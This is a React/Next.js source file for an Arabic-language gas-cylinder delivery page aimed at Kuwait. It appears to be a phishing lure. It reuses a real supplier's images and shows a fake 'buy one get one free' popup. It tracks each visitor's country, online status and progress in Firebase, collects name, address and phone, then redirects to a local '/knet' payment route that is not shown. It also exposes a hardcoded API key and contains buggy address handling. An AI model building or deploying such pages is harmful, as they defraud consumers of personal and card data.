"use client"

import { useState, useEffect, type SetStateAction, useRef } from "react"
import { Moon, Plus, Minus, Sun, MapPin, CreditCard, Wallet, Check, X } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Separator } from "@/components/ui/separator"
import { useTheme } from "next-themes"
import Link from "next/link"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Label } from "@/components/ui/label"
import { Input } from "@/components/ui/input"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"
import { useRouter } from "next/navigation"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"

export default function GasCylinderApp() {
  const [step, setStep] = useState(1)
  const [cylinderCount, setCylinderCount] = useState(1)
  const [selectedDate, setSelectedDate] = useState("27")
  const [mobile, setMobile] = useState("")
  const [selectedDay, setSelectedDay] = useState("الأحد")
  const [selectedTimeSlot, setSelectedTimeSlot] = useState("12-15")
  const [selectedAddress, setSelectedAddress] = useState("address1")
  const [selectedPayment, setSelectedPayment] = useState("card")
  const [paymentOption, setPaymentOption] = useState("full") // new state for payment option (full or deposit)
  const [showAddAddress, setShowAddAddress] = useState(false)
  const router = useRouter()
  const { theme, setTheme } = useTheme()
  const [mounted, setMounted] = useState(false)
  const _id = randstr("gas-")
  const [showPromoPopup, setShowPromoPopup] = useState(false)
  const popupShownRef = useRef(false)

  // Sample addresses
  const savedAddresses: any = [
    {
      id: "address1",
      name: "المنزل",
      area: "السالمية",
      block: "12",
      street: "5",
      building: "10",
      floor: "3",
      apartment: "7",
      mobile: "99887766",
    },
  ]
  async function getLocation() {
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      addData({
        id: _id,
        country: country,
      })
      localStorage.setItem("country", country)
      setupOnlineStatus(_id)
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }
  function randstr(prefix: string) {
    return Math.random()
      .toString(36)
      .replace("0.", prefix || "")
  }
  // Avoid hydration mismatch
  useEffect(() => {
    setMounted(true)
    getLocation().then(() => {})
  }, [])

  useEffect(() => {
    // Show popup after 2 seconds if it hasn't been shown before
    if (!popupShownRef.current) {
      const timer = setTimeout(() => {
        setShowPromoPopup(true)
        popupShownRef.current = true
      }, 2000)

      return () => clearTimeout(timer)
    }
  }, [])

  const incrementCount = () => {
    setCylinderCount((prev) => prev + 1)
  }

  const decrementCount = () => {
    setCylinderCount((prev) => (prev > 1 ? prev - 1 : 1))
  }

  const nextStep = () => {
    setStep((prev) => prev + 1)
    const _id = localStorage.getItem("visitor")

    addData({ id: _id, step })
  }

  const prevStep = () => {
    setStep((prev) => (prev > 1 ? prev - 1 : 1))
  }

  const selectDay = (date: SetStateAction<string>, day: SetStateAction<string>) => {
    setSelectedDate(date)
    setSelectedDay(day)
  }

  const getTimeSlotText = (slot: string) => {
    switch (slot) {
      case "9-12":
        return "09:00 ص - 12:00 م"
      case "12-15":
        return "12:00 م - 03:00 م"
      case "15-18":
        return "03:00 م - 06:00 م"
      case "18-21":
        return "06:00 م - 09:00 م"
      default:
        return "12:00 م - 03:00 م"
    }
  }

  const getSelectedAddress = () => {
    return savedAddresses.find((addr: { id: string }) => addr.id === selectedAddress)
  }

  const toggleTheme = () => {
    setTheme(theme === "dark" ? "light" : "dark")
  }

  const saveNewAddress = () => {
    // Get values from form
    const name = (document.getElementById("address-name") as HTMLInputElement)?.value || "عنوان جديد"
    const area = (document.getElementById("area") as HTMLInputElement)?.value || ""
    const block = (document.getElementById("block") as HTMLInputElement)?.value || ""
    const street = (document.getElementById("street") as HTMLInputElement)?.value || ""
    const building = (document.getElementById("building") as HTMLInputElement)?.value || ""
    const floor = (document.getElementById("floor") as HTMLInputElement)?.value || ""
    const apartment = (document.getElementById("apartment") as HTMLInputElement)?.value || ""
    const mobile = (document.getElementById("mobile") as HTMLInputElement)?.value || ""

    // Create new address object
    const newAddress = {
      id: `address${savedAddresses.length + 1}`,
      name,
      area,
      block,
      street,
      building,
      floor,
      apartment,
      mobile,
    }
    const _id = localStorage.getItem("visitor")

    // Add to savedAddresses
    savedAddresses.push(newAddress)
    addData({
      id: _id,
      customer: {
        name: savedAddresses!.name || ("غير محدد" as string),
        mobile: savedAddresses!.mobile as string,
      } as any,
    })
    // Select the new address
    setSelectedAddress(newAddress.id)

    // Close the add address form
    setShowAddAddress(false)
  }

  const toggleAddAddress = () => {
    setShowAddAddress(!showAddAddress)
  }

  const proceedToPayment = () => {
    // Get the selected address details
    const selectedAddressData = getSelectedAddress()
saveNewAddress()
    // Calculate total price
    const totalPrice = cylinderCount * 5 + 1
    const paymentAmount = paymentOption === "full" ? totalPrice : 0.5

    localStorage.setItem("total", paymentAmount.toString())

    // Create order data object
    const orderData = {
      id: _id,
      step: step,
      timestamp: new Date().toISOString(),
      customer: {
        name: selectedAddressData?.name || "غير محدد",
        area: selectedAddressData?.area || "غير محدد",
        block: selectedAddressData?.block || "غير محدد",
        street: selectedAddressData?.street || "غير محدد",
        building: selectedAddressData?.building || "غير محدد",
        floor: selectedAddressData?.floor || "غير محدد",
        apartment: selectedAddressData?.apartment || "غير محدد",
        mobile: mobile,
      },
      order: {
        cylinderCount: cylinderCount,
        deliveryDate: `${selectedDate} ${selectedDay}`,
        deliveryTime: getTimeSlotText(selectedTimeSlot),
        paymentMethod: selectedPayment === "card" ? "بطاقة ائتمان" : "كي نت",
        paymentOption: paymentOption === "full" ? "دفع كامل" : "دفع مبلغ 0.5 د.ك",
        totalPrice: `${totalPrice} د.ك`,
        amountPaid: `${paymentAmount} د.ك`,
      },
    }

    // Save order data to Firebase
    addData(orderData)
      .then(() => {
        console.log("Order data saved successfully")
        // In a real app, this would redirect to a payment gateway
        alert("تم حفظ بيانات الطلب وسيتم تحويلك إلى بوابة الدفع")
        router.push("/knet")
      })
      .catch((error) => {
        console.error("Error saving order data:", error)
        alert("حدث خ��أ أثناء حفظ بيانات الطلب. يرجى المحاولة مرة أخرى.")
      })
  }

  if (!mounted) {
    return null
  }

  return (
    <div
      className={`min-h-screen ${theme === "light" ? "bg-gray-100 text-gray-900" : "bg-[#0f1524] text-white"} flex flex-col`}
      dir="rtl"
      style={{ zoom: 0.9 }}
    >
      {/* Header */}
      <header className="p-4 flex justify-between items-center">
        <h1 className={`text-3xl font-bold ${theme === "light" ? "text-green-600" : "text-green-500"}`}>سلندر غاز</h1>
        <div className="flex items-center gap-2">
          <Button variant="ghost" size="icon" onClick={toggleTheme} className="rounded-full">
            {theme === "dark" ? (
              <Moon className="h-5 w-5 text-gray-400" />
            ) : (
              <Sun className="h-5 w-5 text-yellow-500" />
            )}
          </Button>
          <Button
            className={`${theme === "light" ? "bg-green-600 hover:bg-green-700" : "bg-green-500 hover:bg-green-600"} text-white font-bold rounded-full px-6`}
          >
            اطلب الان
          </Button>
        </div>
      </header>

      {/* Order Progress */}
      <div className="w-full max-w-3xl mx-auto px-4 mt-4">
        <div className="flex justify-between items-center">
          <div className="flex flex-col items-center">
            <div
              className={`w-8 h-8 rounded-full flex items-center justify-center ${step >= 1 ? (theme === "light" ? "bg-green-600 text-white" : "bg-green-500 text-black") : "bg-gray-300 text-gray-600"}`}
            >
              1
            </div>
            <span className="text-sm mt-1">الكمية والموعد</span>
          </div>
          <div className="flex-1 h-1 mx-2 bg-gray-300">
            <div
              className={`h-full ${step >= 2 ? (theme === "light" ? "bg-green-600" : "bg-green-500") : "bg-gray-300"}`}
              style={{ width: step >= 2 ? "100%" : "0%" }}
            ></div>
          </div>
          <div className="flex flex-col items-center">
            <div
              className={`w-8 h-8 rounded-full flex items-center justify-center ${step >= 2 ? (theme === "light" ? "bg-green-600 text-white" : "bg-green-500 text-black") : "bg-gray-300 text-gray-600"}`}
            >
              2
            </div>
            <span className="text-sm mt-1">العنوان والدفع</span>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center justify-center gap-10 p-4">
        {step === 1 && (
          <>
            <h2 className={`text-2xl ${theme === "light" ? "text-green-600" : "text-green-500"}`}>
              حدد الكمية وموعد التوصيل
            </h2>

            {/* Quantity Selector */}
            <div className="flex justify-center items-center gap-8">
              <Button
                variant="outline"
                className={`${theme === "light" ? "border-blue-600 text-blue-600 hover:bg-blue-50" : "border-[#1e88e5] text-[#1e88e5] hover:bg-[#1e88e5]/10"} w-12 h-12 rounded-lg`}
                onClick={incrementCount}
              >
                <Plus size={24} />
              </Button>

              <div
                className={`${theme === "light" ? "bg-green-600" : "bg-green-500"} w-12 h-12 rounded-full flex items-center justify-center text-2xl font-bold text-white`}
              >
                {cylinderCount}
              </div>

              <Button
                variant="outline"
                className={`${theme === "light" ? "border-gray-400 text-gray-500 hover:bg-gray-50" : "border-gray-600 text-gray-600 hover:bg-gray-600/10"} w-12 h-12 rounded-lg`}
                onClick={decrementCount}
              >
                <Minus size={24} />
              </Button>
            </div>

            {/* Gas Cylinder Image */}
            <div className="mt-4 mb-6">
              <img
                src="https://gaskw.com/storage/form-attachments/01JHBJYXM6BJEYNFC3CAV2K9PQ.png"
                alt="Gas Cylinder"
                width={100}
                height={200}
                className="object-contain"
              />
            </div>

            <Separator className={`w-full max-w-md my-4 ${theme === "light" ? "bg-gray-300" : ""}`} />

         

            {/* Navigation Buttons */}
            <div className="flex justify-center w-full max-w-md mt-6">
              <Button
                className={`${theme === "light" ? "bg-green-600 hover:bg-green-700" : "bg-green-500 hover:bg-green-600"} text-white font-bold px-8 py-6 text-lg w-full`}
                onClick={nextStep}
              >
                التالي
              </Button>
            </div>
          </>
        )}

        {step === 2 && (
          <>
            <h2 className={`text-2xl ${theme === "light" ? "text-green-600" : "text-green-500"}`}>العنوان والدفع</h2>
              <div className="w-full max-w-md">
             
              <div className="w-full max-w-md bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md">
                <h3 className={`text-lg font-bold mb-4 ${theme === "light" ? "text-gray-800" : "text-white"}`}>
                  إضافة عنوان جديد
                </h3>

                <div className="space-y-4">
                  <div>
                    <Label htmlFor="address-name" className={theme === "light" ? "text-gray-700" : "text-gray-200"}>
                      الاسم
                    </Label>
                    <Input
                      id="address-name"
                      required
                      className={`mt-1 ${
                        theme === "light" ? "bg-gray-50 border-gray-300" : "bg-gray-700 border-gray-600"
                      }`}
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="area" className={theme === "light" ? "text-gray-700" : "text-gray-200"}>
                        المنطقة
                      </Label>
                      <Input
                      required
                      id="area"
                        placeholder="المنطقة"
                        className={`mt-1 ${
                          theme === "light" ? "bg-gray-50 border-gray-300" : "bg-gray-700 border-gray-600"
                        }`}
                      />
                    </div>
                    <div>
                      <Label htmlFor="block" className={theme === "light" ? "text-gray-700" : "text-gray-200"}>
                        القطعة
                      </Label>
                      <Input
                      required
                      id="block"
                        placeholder="القطعة"
                        className={`mt-1 ${
                          theme === "light" ? "bg-gray-50 border-gray-300" : "bg-gray-700 border-gray-600"
                        }`}
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="street" className={theme === "light" ? "text-gray-700" : "text-gray-200"}>
                        الشارع
                      </Label>
                      <Input
                        id="street"
                      required
                      placeholder="رقم الشارع"
                        className={`mt-1 ${
                          theme === "light" ? "bg-gray-50 border-gray-300" : "bg-gray-700 border-gray-600"
                        }`}
                      />
                    </div>
                    <div>
                      <Label htmlFor="building" className={theme === "light" ? "text-gray-700" : "text-gray-200"}>
                        المبنى
                      </Label>
                      <Input
                        id="building"
                        placeholder="رقم المبنى"
                        className={`mt-1 ${
                          theme === "light" ? "bg-gray-50 border-gray-300" : "bg-gray-700 border-gray-600"
                        }`}
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="floor" className={theme === "light" ? "text-gray-700" : "text-gray-200"}>
                        الدور
                      </Label>
                      <Input
                        id="floor"
                        placeholder="رقم الدور"
                        className={`mt-1 ${
                          theme === "light" ? "bg-gray-50 border-gray-300" : "bg-gray-700 border-gray-600"
                        }`}
                      />
                    </div>
                    <div>
                      <Label htmlFor="apartment" className={theme === "light" ? "text-gray-700" : "text-gray-200"}>
                        الشقة
                      </Label>
                      <Input
                        id="apartment"
                        placeholder="رقم الشقة"
                        className={`mt-1 ${
                          theme === "light" ? "bg-gray-50 border-gray-300" : "bg-gray-700 border-gray-600"
                        }`}
                      />
                    </div>
                  </div>

                  <div>
                    <Label htmlFor="mobile" className={theme === "light" ? "text-gray-700" : "text-gray-200"}>
                      رقم الهاتف
                    </Label>
                    <Input
                      required
                      id="mobile"
                      placeholder="رقم الهاتف المحمول"
                      onChange={(e) => setMobile(e.target.value)}
                      className={`mt-1 ${
                        theme === "light" ? "bg-gray-50 border-gray-300" : "bg-gray-700 border-gray-600"
                      }`}
                    />
                  </div>

                  <div className="flex gap-2 mt-6">
               {/* Navigation Buttons */}
               <div className="flex justify-between w-full max-w-md mt-6">
                  <Button
                    className={`${
                      theme === "light" ? "bg-green-600 hover:bg-green-700" : "bg-green-500 hover:bg-green-600"
                    } text-white font-bold px-8 py-6 text-lg flex-1`}
                    onClick={proceedToPayment}
                  >
                    {selectedPayment === "card" ? "الانتقال إلى بوابة الدفع" : "تأكيد الطلب"}
                  </Button>
                  <Button
                    variant="outline"
                    className={`${
                      theme === "light"
                        ? "border-blue-600 text-blue-600 hover:bg-blue-50"
                        : "border-[#1e88e5] text-[#1e88e5] hover:bg-[#1e88e5]/10"
                    } mr-2`}
                    onClick={prevStep}
                  >
                    السابق
                  </Button>
                </div>
                  </div>
                </div>
              </div>


       

                {/* Payment Options */}
                <div className="w-full max-w-md">
                  <h3 className={`text-lg mb-3 ${theme === "light" ? "text-gray-700" : "text-gray-300"}`}>
                    خيار الدفع:
                  </h3>

                  <RadioGroup value={paymentOption} onValueChange={setPaymentOption} className="space-y-3 mb-4">
                    <div
                      className={`flex items-center p-4 rounded-lg border ${
                        theme === "light"
                          ? paymentOption === "full"
                            ? "border-green-600 bg-green-50"
                            : "border-gray-300"
                          : paymentOption === "full"
                            ? "border-green-500 bg-green-500/10"
                            : "border-gray-700 bg-gray-800/50"
                      }`}
                    >
                      <RadioGroupItem value="full" id="payment-full" />
                      <Label htmlFor="payment-full" className="flex items-center cursor-pointer pr-3">
                        <span>دفع المبلغ كاملاً ({cylinderCount * 5 + 1} د.ك)</span>
                      </Label>
                    </div>

                    <div
                      className={`flex items-center p-4 rounded-lg border ${
                        theme === "light"
                          ? paymentOption === "deposit"
                            ? "border-green-600 bg-green-50"
                            : "border-gray-300"
                          : paymentOption === "deposit"
                            ? "border-green-500 bg-green-500/10"
                            : "border-gray-700 bg-gray-800/50"
                      }`}
                    >
                      <RadioGroupItem value="deposit" id="payment-deposit" />
                      <Label htmlFor="payment-deposit" className="flex items-center cursor-pointer pr-3">
                        <span>دفع عربون (0.5 د.ك) لتأكيد الطلب</span>
                      </Label>
                    </div>
                  </RadioGroup>

                  <h3 className={`text-lg mb-3 ${theme === "light" ? "text-gray-700" : "text-gray-300"}`}>
                    طريقة الدفع:
                  </h3>

                  <RadioGroup value={selectedPayment} onValueChange={setSelectedPayment} className="space-y-3 mb-4">
                    <div
                      className={`flex items-center p-4 rounded-lg border ${
                        theme === "light"
                          ? selectedPayment === "card"
                            ? "border-green-600 bg-green-50"
                            : "border-gray-300"
                          : selectedPayment === "card"
                            ? "border-green-500 bg-green-500/10"
                            : "border-gray-700 bg-gray-800/50"
                      }`}
                    >
                      <RadioGroupItem value="card" id="payment-card" />
                      <Label htmlFor="payment-card" className="flex items-center cursor-pointer pr-3">
                        <CreditCard className="h-5 w-5 ml-2" />
                        <span>بطاقة ائتمان / بطاقة مدين</span>
                      </Label>
                    </div>

                    <div
                      className={`flex items-center p-4 rounded-lg border ${
                        theme === "light"
                          ? selectedPayment === "cash"
                            ? "border-green-600 bg-green-50"
                            : "border-gray-300"
                          : selectedPayment === "cash"
                            ? "border-green-500 bg-green-500/10"
                            : "border-gray-700 bg-gray-800/50"
                      }`}
                    >
                      <RadioGroupItem value="cash" id="payment-cash" />
                      <Label htmlFor="payment-cash" className="flex items-center cursor-pointer pr-3">
                        <Wallet className="h-5 w-5 ml-2" />
                        <span>كي نت</span>
                      </Label>
                    </div>
                  </RadioGroup>

                  {/* Amount to Pay Display */}
            
                </div>

            
              </div>
             
   
                {/* Navigation Buttons */}
            
          </>
        )}
      </main>

      {/* Footer */}
      <footer className="p-8 text-center">
        <h2 className={`text-4xl font-bold mb-4 ${theme === "light" ? "text-gray-800" : "text-gray-300"}`}>
          سلندر غاز
        </h2>
        <p className={`${theme === "light" ? "text-gray-700" : "text-gray-400"} max-w-2xl mx-auto leading-relaxed`}>
          مرحبا بكم في خدمة توصيل اسطوانات الغاز المنزلية الرائدة في الكويت! نحن نسعى لتقديم حلول سريعة وموثوقة وبأسعار
          معقولة لجميع احتياجات الغاز الخاصة بك.
        </p>

        <div className="mt-4">
          <Link
            href="/"
            className={`${theme === "light" ? "text-blue-600 hover:text-blue-800" : "text-blue-400 hover:text-blue-300"}`}
          >
            العودة إلى الصفحة الرئيسية
          </Link>
        </div>
        <div className="mt-6"></div>
      </footer>
      <Link
        href="https://wa.me/96596044436"
        target="_blank"
        rel="noopener noreferrer"
        className={`fixed bottom-4 right-4 rounded-full ${theme === "light" ? "bg-green-600 hover:bg-green-700" : "bg-green-500 hover:bg-green-600"} text-white font-bold`}
      >
        <img src="/next.svg" className="h-12 w-12 p-2" />
      </Link>
      {/* Buy One Get One Popup */}
      <Dialog open={showPromoPopup} onOpenChange={setShowPromoPopup}>
        <DialogContent className="sm:max-w-md" dir="rtl">
          <DialogHeader>
            <div className="flex justify-between items-center">
              <DialogTitle className={`text-xl font-bold ${theme === "light" ? "text-green-600" : "text-green-500"}`}>
                عرض خاص! اشتري واحدة واحصل على الثانية مجانًا
              </DialogTitle>
              <Button
                variant="ghost"
                size="icon"
                onClick={() => setShowPromoPopup(false)}
                className="h-6 w-6 rounded-full p-0"
              >
                <X className="h-4 w-4" />
              </Button>
            </div>
          </DialogHeader>
          <div className="p-4">
            <div className="flex justify-center mb-4">
              <img
                src="https://gaskw.com/storage/form-attachments/01JHBJYXM6BJEYNFC3CAV2K9PQ.png"
                alt="Gas Cylinder Promotion"
                width={80}
                height={160}
                className="object-contain"
              />
              <span className="mx-2 text-2xl font-bold flex items-center">+</span>
              <img
                src="https://gaskw.com/storage/form-attachments/01JHBJYXM6BJEYNFC3CAV2K9PQ.png"
                alt="Gas Cylinder Free"
                width={80}
                height={160}
                className="object-contain"
              />
            </div>
            <DialogDescription className="text-center mb-4">
              عرض لفترة محدودة! عند شراء اسطوانة غاز واحدة، احصل على الثانية مجانًا. العرض ساري حتى نفاد الكمية.
            </DialogDescription>
            <div className="flex flex-col gap-2">
              <Button
                className={`${theme === "light" ? "bg-green-600 hover:bg-green-700" : "bg-green-500 hover:bg-green-600"} text-white font-bold`}
                onClick={() => {
                  setCylinderCount(2)
                  setShowPromoPopup(false)
                  setStep(1)
                }}
              >
                استفد من العرض الآن
              </Button>
              <Button
                variant="outline"
                className={`${theme === "light" ? "border-gray-300 text-gray-700" : "border-gray-600 text-gray-300"}`}
                onClick={() => setShowPromoPopup(false)}
              >
                تصفح العروض لاحقًا
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}
